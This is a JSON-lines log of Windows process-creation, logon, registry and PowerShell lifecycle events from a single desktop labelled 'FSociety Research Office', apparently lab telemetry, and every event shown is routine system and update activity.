{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"C:\\Windows\\system32\\sc.exe start wuauserv","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\sc.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"C:\\Windows\\System32\\wsqmcons.exe","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\wsqmcons.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"C:\\Windows\\system32\\sc.exe start pushtoinstall registration","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\sc.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"taskhostw.exe","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\taskhostw.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"C:\\Windows\\system32\\devicecensus.exe","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\DeviceCensus.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"C:\\Windows\\system32\\usoclient.exe StartScan","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\UsoClient.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"C:\\Windows\\System32\\UNP\\UpdateNotificationMgr.exe","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\UNP\\UpdateNotificationMgr.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesCommonx86\\Microsoft Shared\\Office16\\OLicenseHeartbeat.exe\"","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesCommonX86\\Microsoft Shared\\OFFICE16\\OLicenseHeartbeat.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:02","winlog.event_data.CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s PushToInstall","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:03","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:03","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:03","winlog.event_data.CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\Explorer.EXE","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:03","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:03","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:03","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:03","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:03","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:03","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:03","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:03","winlog.event_data.CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:03","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:05","winlog.event_data.CommandLine":"\"C:\\Program Files (x86)\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe\"","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:05","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:06","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:06","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:06","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:06","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:09","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:09","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:09","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:09","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:09","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:09","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:09","winlog.event_data.CommandLine":"\"C:\\Program Files\\WindowsApps\\Microsoft.SkypeApp_15.75.140.0_x86__kzf8qxf38zg5c\\Skype\\Skype.exe\" --type=gpu-process --field-trial-handle=2284,10938351909814765404,11544744416228621088,131072 --enable-features=WebComponentsV0Enabled,WinUseBrowserSpellChecker,WinUseHybridSpellChecker --disable-features=CertVerifierService,CookiesWithoutSameSiteMustBeSecure,SameSiteByDefaultCookies,SpareRendererForSitePerProcess --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.18362.1049 --user-data-dir=\"C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Skype for Store\" --gpu-preferences=SAAAAAAAAADoAAAwAAAAAAAAAAAAAAAAAABgAAAQAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4AAAAAAAAAHgAAAAAAAAAKAAAAAQAAAAgAAAAAAAAACgAAAAAAAAAMAAAAAAAAAA4AAAAAAAAABAAAAAAAAAAAAAAAAUAAAAQAAAAAAAAAAAAAAAGAAAAEAAAAAAAAAABAAAABQAAABAAAAAAAAAAAQAAAAYAAAAIAAAAAAAAAAgAAAAAAAAA --mojo-platform-channel-handle=2980 /prefetch:2","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files\\WindowsApps\\Microsoft.SkypeApp_15.75.140.0_x86__kzf8qxf38zg5c\\Skype\\Skype.exe\" ","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:09","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files\\WindowsApps\\Microsoft.SkypeApp_15.75.140.0_x86__kzf8qxf38zg5c\\Skype\\Skype.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:11","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:11","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Engine Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:11","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:11","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:11","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:11","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\devicecensus.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:12","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:12","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:12","winlog.event_data.CommandLine":"C:\\Windows\\System32\\usocoreworker.exe -Embedding","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:12","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\usocoreworker.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:13","winlog.event_data.CommandLine":"%%systemroot%%\\system32\\MusNotifyIcon.exe NotifyTrayIcon 0","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\System32\\usocoreworker.exe -Embedding","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\MusNotifyIcon.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:13","winlog.event_data.CommandLine":"C:\\Windows\\system32\\svchost.exe -k wusvcs -p -s WaaSMedicSvc","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
